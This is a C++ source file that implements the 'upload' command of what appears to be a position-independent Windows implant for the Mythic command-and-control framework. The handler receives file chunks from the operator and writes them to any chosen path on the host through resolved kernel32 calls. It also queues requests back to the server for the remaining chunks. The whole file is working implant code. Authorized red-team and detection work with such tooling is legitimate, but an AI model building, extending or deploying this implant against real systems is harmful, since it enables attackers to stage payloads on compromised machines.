#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_UPLOAD

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_upload(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // params: file_id(string) + remote_path(string) + total_chunks(uint32) + chunk_num(uint32) + chunk_data(bytes)
    //
    // Mythic upload protocol via translator:
    //   1. First tasking delivers: file_id + remote_path + total_chunks + chunk_num(1) + chunk_data
    //   2. Agent writes chunk, responds with UPLOAD_REQUEST for next chunk
    //   3. Translator sees UPLOAD_REQUEST, fetches next chunk from Mythic, sends as new tasking
    //   4. Repeat until all chunks received
    //
    // For simplicity in PIC agent: we handle the full file in a single invocation
    // if total_chunks==1, or do multi-step via response queue for larger files.

    uint32_t file_id_len = 0;
    auto file_id = parser_string( params, &file_id_len );
    if ( !file_id || file_id_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no file_id" ) ) );
        return;
    }

    char file_id_buf[64] = { 0 };
    uint32_t fid_copy = file_id_len < 63 ? file_id_len : 63;
    memory::copy( file_id_buf, file_id, fid_copy );

    uint32_t path_len = 0;
    auto remote_path = parser_string( params, &path_len );
    if ( !remote_path || path_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no remote_path" ) ) );
        return;
    }

    char path_buf[520] = { 0 };
    uint32_t copy_len = path_len < 519 ? path_len : 519;
    memory::copy( path_buf, remote_path, copy_len );

    uint32_t total_chunks = parser_int32( params );
    uint32_t chunk_num    = parser_int32( params );

    // get chunk data
    uint32_t chunk_data_len = 0;
    auto chunk_data = parser_bytes( params, &chunk_data_len );

    // open/create file
    wchar_t wpath[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );

    DWORD create_flag = ( chunk_num == 1 ) ? CREATE_ALWAYS : OPEN_EXISTING;
    HANDLE h_file = inst.kernel32.CreateFileW(
        wpath,
        GENERIC_WRITE,
        0,
        nullptr,
        create_flag,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if ( h_file == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateFileW failed" ) ) );
        return;
    }

    // seek to end for append (chunk > 1)
    if ( chunk_num > 1 ) {
        inst.kernel32.SetFilePointer( h_file, 0, nullptr, FILE_END );
    }

    // write chunk
    if ( chunk_data && chunk_data_len > 0 ) {
        DWORD written = 0;
        inst.kernel32.WriteFile( h_file, chunk_data, chunk_data_len, &written, nullptr );
    }

    inst.kernel32.CloseHandle( h_file );

    if ( chunk_num < total_chunks ) {
        // request next chunk
        auto pkg = package_create( inst );
        package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
        package_add_string( inst, pkg, task_uuid );
        package_add_byte( inst, pkg, RESPONSE_PROCESSING );
        package_add_byte( inst, pkg, UPLOAD_REQUEST );
        package_add_string( inst, pkg, file_id_buf );
        package_add_int32( inst, pkg, chunk_num + 1 );
        package_add_string( inst, pkg, path_buf );
        package_add_int32( inst, pkg, total_chunks );

        uint32_t data_len = 0;
        auto data = package_build( pkg, &data_len );

        uint32_t needed = inst.response_queue.length + 4 + data_len;
        if ( needed > inst.response_queue.capacity ) {
            uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
            while ( new_cap < needed ) new_cap *= 2;
            inst.response_queue.buffer = static_cast<uint8_t*>(
                inst.heap_realloc( inst.response_queue.buffer, new_cap )
            );
            inst.response_queue.capacity = new_cap;
        }

        auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
        qbuf[0] = (data_len >> 24) & 0xFF;
        qbuf[1] = (data_len >> 16) & 0xFF;
        qbuf[2] = (data_len >> 8)  & 0xFF;
        qbuf[3] = data_len & 0xFF;
        memory::copy( qbuf + 4, data, data_len );
        inst.response_queue.length += 4 + data_len;

        package_destroy( inst, pkg );
    } else {
        // all chunks received
        char msg[128] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "uploaded to " ) ) );
        str_concat( msg, path_buf );
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
    }
}

#endif
